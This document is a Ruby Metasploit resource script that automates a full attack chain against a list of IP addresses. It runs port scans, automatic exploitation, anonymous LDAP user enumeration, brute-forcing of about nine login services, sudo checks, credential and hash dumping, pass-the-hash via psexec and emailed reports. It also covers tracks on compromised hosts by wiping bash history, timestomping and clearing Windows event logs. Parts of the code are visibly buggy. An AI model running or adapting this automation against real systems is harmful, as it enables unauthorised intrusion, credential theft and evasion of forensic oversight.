<ruby>
# Scan loop on all IPs 
# To do most of job, install pentest plugin first
# Install my reportEmail plugin to send PDF reports to email
# mkdir â€“p $HOME/.msf4/plugins
# cd $HOME/.msf4/plugins
# wget https://raw.github.com/darkoperator/Metasploit-Plugins/master/pentest.rb

require 'socket'

path='/root/IPs.txt'
remains=''
line=''
each=''
before=''
userfile=nil

# Function to get users input on Metasploit
def getin()
        return $stdin.readline
end

# This function inserts any passwords found on brute force scans into report. For this, install xmlstarlet tool
def bruteforce(target)
run_single("db_export -f pwdump -a /root/pwdump.txt")
target="#{target}".chomp

sshuser = []
sshpass = []
mysuser = []
myspass = []
smbuser = []
smbpass = []
ftpuser = []
ftppass = []
teluser = []
telpass = []
vncuser = []
vncpass = []
sqluser = []
sqlpass = []
popuser = []
poppass = []
psqluse = []
psqlpas = []
credssh=nil
credmys=nil
credsmb=nil
credftp=nil
credtel=nil
credvnc=nil
credsql=nil
credpop=nil
crepsql=nil
hassh = Hash.new
hamys = Hash.new
hasmb = Hash.new
haftp = Hash.new
hatel = Hash.new
havnc = Hash.new
hasql = Hash.new
hapop = Hash.new
hapsq = Hash.new
count=0
nextline=0

File.open("/root/pwdump.txt").each_line do |line|
nextline += 1
        if (line =~ /[Ss][Ss][Hh]/)
	        hassh["credssh#{count}"] = nextline
	        count = count + 1
	elsif  (line =~ /[Mm][Yy][Ss][Qq][Ll]/)
		hamys["credmys#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Mm][Yy][Ss][Qq][Ll]/ or line =~ /[Mm]icrosoft-[Dd][Ss]/ or line =~ /[Nn]etbios-[Ss][Ss][Nn]/)
		hasmb["credsmb#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Ff][Tt][Pp]/)
		haftp["credftp#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Tt]elnet/)
		hatel["credtel#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Vv][Nn][Cc]/)
		havnc["credvnc#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Mm][Ss][Ss]ql/)
		hasql["credsql#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Pp][Oo][Pp]3/)
		hapop["credpop#{count}"] = nextline
		count = count + 1
	elsif  (line =~ /[Pp]ostgres/)
		hapsq["crepsql#{count}"] = nextline
		count = count + 1
	end
end

file = IO.readlines("./pwdump.txt")

if (! hassh.empty?)
hassh.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			sshuser.push("#{wrd}")
		else
			sshpass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/module" -t elem -n password -v "#{sshpass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/username"  -v "#{sshuser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == sshuser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "/MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/ssh/ssh_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/module" -t elem -n username -v "#{sshuser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/module" -t elem -n password -v "#{sshpass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == sshuser.length)
                       break
                end
end
end
end

if (! hamys.empty?)
hamys.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			mysuser.push("#{wrd}")
		else
			myspass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/module" -t elem -n password -v "#{myspass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/username" -v "#{mysuser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == mysuser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/mysql/mysql_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/module" -t elem -n username -v "#{mysuser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/module" -t elem -n password -v "#{myspass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == mysuser.length)
                        break
                end
end
end
end

if (! hasmb.empty?)
hasmb.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			smbuser.push("#{wrd}")
		else
			smbpass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/module" -t elem -n password -v "#{smbpass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/username" -v "#{smbuser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == smbuser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/smb/smb_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/module" -t elem -n username -v "#{smbuser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/module" -t elem -n password -v "#{smbpass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == smbuser.length)
                        break
                end
end
end
end

if (! haftp.empty?)
haftp.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			ftpuser.push("#{wrd}")
		else
			ftppass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/module" -t elem -n password -v "#{ftppass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/username" -v "#{ftpuser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == ftpuser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/ftp/ftp_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/module" -t elem -n username -v "#{ftpuser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/module" -t elem -n password -v "#{ftppass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == ftpuser.length)
                        break
                end
end
end
end

if (! hatel.empty?)
hatel.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			teluser.push("#{wrd}")
		else
			telpass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/module" -t elem -n password -v "#{telpass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/username" -v "#{teluser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == teluser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/telnet/telnet_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/module" -t elem -n username -v "#{teluser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/module" -t elem -n password -v "#{telpass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == teluser.length)
                        break
                end
end
end
end

if (! havnc.empty?)
havnc.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			vncuser.push("#{wrd}")
		else
			vncpass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/module" -t elem -n password -v "#{vncpass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/username" -v "#{vncuser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == vncuser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/vnc/vnc_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/module" -t elem -n username -v "#{vncuser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/module" -t elem -n password -v "#{vncpass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == vncuser.length)
                        break
                end
end
end
end

if (! hasql.empty?)
hasql.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			sqluser.push("#{wrd}")
		else
			sqlpass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/module" -t elem -n password -v "#{sqlpass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/username" -v "#{sqluser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == sqluser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/mssql/mssql_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/module" -t elem -n username -v "#{sqluser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/module" -t elem -n password -v "#{sqlpass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == sqluser.length)
                        break
                end
end
end
end

if (! hapop.empty?)
hapop.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			popuser.push("#{wrd}")
		else
			poppass.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/module" -t elem -n password -v "#{poppass[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/username" -v "#{popuser[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == popuser.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/pop3/pop3_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/module" -t elem -n username -v "#{popuser[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/module" -t elem -n password -v "#{poppass[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == popuser.length)
                        break
                end
end
end
end

if (! hapsq.empty?)
hapsq.each do |key, value|
	file[value].split.each_with_index do |wrd, idx| 
		if ((idx) % 2 == 0)
			psqluse.push("#{wrd}")
		else
			psqlpas.push("#{wrd}")
		end	
	end
end

`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']/module" "/root/#{target}.xml"`
if ($?.exitstatus == 0)
i=0
j=1
loop do
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/module" -t elem -n password -v "#{psqlpas[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/username" -v "#{psqluse[i]}" "/root/#{target}.xml"`
	i += 1
	j += 1
		if (i == psqluse.length)
			break
		end
end

else
i=0
j=1
loop do
`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/postgres/postgres_login" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/module" -t elem -n username -v "#{psqluse[i]}" "/root/#{target}.xml"`
`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/module" -t elem -n password -v "#{psqlpas[i]}" "/root/#{target}.xml"`
        i += 1
	j += 1
                if (i == psqluse.length)
                        break
                end
end
end
end

if ($?.success?)
	File.delete("/root/pwdump.txt")
end
end

# wordlists
pathdefault = "/usr/share/metasploit-framework/data/wordlists/"
print_line("The user and password lists already been set, but you can adjust to yours...")
print_line("It defaults to #{pathdefault}{unix_users.txt,unix_passwords.txt}")
print_line("if so, just hit ENTER, else copy these files to that directory and just pass your names here.")
print_line("...then happy cracking!")
print_line("Users filename:")
user_file = getin
user_file = user_file.chomp
print_line("Passwords filename:")
pass_file = getin
pass_file = pass_file.chomp

if (user_file != '')
	run_single("setg USER_FILE #{pathdefault}#{user_file}")
else
	run_single("setg USER_FILE #{pathdefault}unix_users.txt")
end
if (pass_file != '')
	run_single("setg PASS_FILE #{pathdefault}#{pass_file}")
else
	run_single("setg PASS_FILE #{pathdefault}unix_passwords.txt")
end

# This lists all IP addresses from attacker's machine and defines LHOST with the first that's don't be localhost nor IPv6
sock = []
lhost = []

sock = Socket.ip_address_list
sock.each do |ip|
        lhost.push(ip.ip_address)
end

lhost.each do |ip|
        if !ip.include? ("127" or "::")
		run_single("setg LHOST #{ip}")
                break
        end
end

run_single("load reportEmail")
run_single("load pentest")
Dir.chdir('/root')
File.foreach(path) { |each|
File.open(path, 'r') {|file| line=file.gets; remains=file.read}
  run_single("setg RHOSTS #{line}")
  run_single("db_nmap #{line} -sS -O")
  sleep 10
  run_single("db_nmap -sU -P0 --max-retries 1 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{line}")
  sleep 10
  run_single("discover_db -r #{line}/32")
  run_single("vuln_exploit -j 1")
if ("#{before}" != '')
  run_single("hosts -d #{before}")
end
  before="#{line}"

# Test if we get some system users via LDAP or MS AD
framework.db.hosts.each do |host|
	if (host.os_name =~ /[Ll]inux/)
		host.services.each do |serv|
			if (serv.state == Msf::ServiceState::Open)
				if (serv.port.to_i == 389)
					# search for users via LDAP anonymous bind
					# need the ldap-utils package
					# it can't run within a function
					shell = []
					arr = []
					names = []
					str = nil
					fmts = nil
					org = nil
					shell = %x|nmap -sV -p 389 --script ldap-rootdse #{line}|
					shell.each_line do |line|
        					if (line =~ /namingContexts/)
                					str = line
                					fmts = "#{str}".squeeze(' ')
                					arr = fmts.split(" ")
                					org = arr[2]
							print_line(org)
							break
						end
					end

					names = %x|ldapsearch -LLL -w '' -x -h "#{line}" -b "#{org}" dn|
					print_line(names)
						if ($?.success?)
							names = names.gsub!("\n\n", "\n")
							names = names.gsub!(/dn: uid=|cn=|,.*/) { '' }
							if (names =~ /dn: /)
			        				names.gsub!(/dn:.*\n/, '')
							end
							file = File.open("/root/uid.txt", "w")
							file.puts(names)
							file.close
						end
				end
			end
		end
	end
end

# If we have found some users, put them on users file
if (File.exist?('/root/uid.txt') and !(File.zero?('/root/uid.txt')))
	run_single("setg USER_FILE /root/uid.txt")
	userfile = true
end

# If exploits don't work, try brute force on services
if (framework.sessions.length <= 0)
  framework.db.hosts.each do |host|
    if (host.os_name =~ /[Ll]inux/)
        run_single("set VERBOSE true")
        run_single("set THREADS 1")
        run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc")
    elsif (host.os_name =~ /[Ww]indows/)
        run_single("set VERBOSE true")
	run_single("set THREADS 1")
	run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc")
    end
  end
end

# If we get a login and OS type is Linux, test if it gets sudo
if (framework.sessions.length > 0)
  framework.db.hosts.each do |host|
    if (host.os_name =~ /[Ll]inux/)
	run_single("use post/multi/manage/sudo")
	run_single("set SESSION 1")
	run_single("run")
	run_single("sessions -i 1 -c 'id -u'")
	run_single("back")
    end
  end
end


# Post exploit on Linux
if (framework.sessions.length > 0)
  framework.db.hosts.each do |host|
    if (host.os_name =~ /[Ll]indows/)
      	run_single("sys_creds -s 1")
      	run_single("sessions -i 1 -c 'echo > ~/.bash_history'")
	run_single("sessions -i 1 -c 'touch -r /etc/passwd ~/.bash_history'")
	run_single("sessions -i 1 -c 'export HISTSIZE=0'")
    end
  end
end


# If there is an web service, do it's own scan
framework.db.hosts.each do |host|
    host.services.each do |serv|
      if (serv.state == Msf::ServiceState::Open)
	if ((serv.port.to_i == 80) or (serv.port.to_i == 443))
	  run_single("load wmap")
	  run_single("wmap_sites -a http://#{line}")
	  run_single("wmap_targets -t http://#{line}")
	  run_single("wmap_run -t")
	  run_single("wmap_run -e")
	  run_single("wmap_vulns -l")
	end
      end
    end
end

# Post exploit on Windows
if (framework.sessions.length > 0)
  framework.db.hosts.each do |host|
    if (host.os_name =~ /[Ww]indows/)
      	run_single("app_creds -s 1")
      	run_single("sys_creds -s 1")
      	run_single("clearev")
    end
  end
end

# After dump Windows hashes, try sys access with psexec
if (framework.sessions.length > 0)
  framework.db.hosts.each do |host|
    if (host.os_name =~ /[Ww]indows/)
	framework.db.creds.each do |creds|
		next if (creds.ptype =~ /smb_hash/)
      			run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_pass_the_hash.rc")
		end
	end
    end
end

# Generate a XML report if there are some open session
# bug
if (framework.sessions.length > 0)
	run_single("db_export -f xml -a /root/#{line}.xml")
print_line("criou xml")
	bruteforce(line)
print_line("terminou brute")
	line="#{line}".chomp


# To create PDF reports, install Apache's FOP from https://xmlgraphics.apache.org/fop/download.html on /opt
# bug
if ($?.success?)
	run_single("xsltproc --output /root/#{line}.fo --stringparam fop1.extensions 1 /root/metasploitReportTemplate.xsl /root/#{line}.xml")
print_line("criou fop")
	run_single("/opt/fop-2.3/fop/fop /root/#{line}.fo /root/#{line}.pdf")
print_line("criou pdf")
end

# Send PDF report to email with reportEmail plugin
if ($?.success?)
	run_single("reportEmail #{line}")
end

# bug
#if ($?.success?)
#	File.delete("/root/#{line}.xml")
#	File.delete("/root/#{line}.fo")
#end
end

# If LDAP or AD user file exist, remove it
if (File.file?('/root/uid.txt'))
	File.delete('/root/uid.txt')
end

# Terminate all open sessions and remove host from DB to don't contaminate next scan
run_single("sessions -K")
framework.db.hosts.each do |host|
if (host.address != nil || host.address != 0)
	run_single("hosts -d")
# bug
#	while ($?.exitstatus != 0)
#		run_single("hosts -d")
#	end
end
end

# after this host, back to original userfile
if (userfile)
	if (user_file != '')
		run_single("setg USER_FILE #{pathdefault}#{user_file}")
	else
		run_single("setg USER_FILE #{pathdefault}unix_users.txt")
	end
end

# Remove this IP from list to don't repeat it in case of script restart
File.open(path, 'w+') {|file| file.write(remains)}
}
run_single("quit")
</ruby>
